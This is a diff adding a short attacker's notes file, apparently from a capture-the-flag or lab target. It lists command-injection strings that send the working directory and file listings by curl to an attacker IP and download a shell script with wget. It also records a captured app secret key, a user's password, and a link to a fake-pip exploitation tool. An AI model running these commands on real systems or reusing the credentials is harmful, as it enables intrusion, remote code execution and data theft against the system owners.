@@ -1,0 +1,19 @@
+get directory
+
+cmd = "curl --data $(pwd) 10.10.14.143:8001"
+
+ls command
+
+cmd = "ls -al / > /tmp/tmp1; curl --form 'filename=@/tmp/tmp1' 10.10.14.143:8001"
+
+
+upload file shell
+
+cmd = "cd /tmp; /usr/bin/wget 10.10.14.143:8002/shell.py;ls -al /tmp > /tmp/tmp1; curl --form 'filename=@/tmp/tmp1' 10.10.14.143:8001"
+
+
+app secret key sjhdajkh292hdq29dhashdkjsad
+
+homer passwd 0B4jyA0xtytZi7esBNGp
+
+https://github.com/0x00-0x00/FakePip
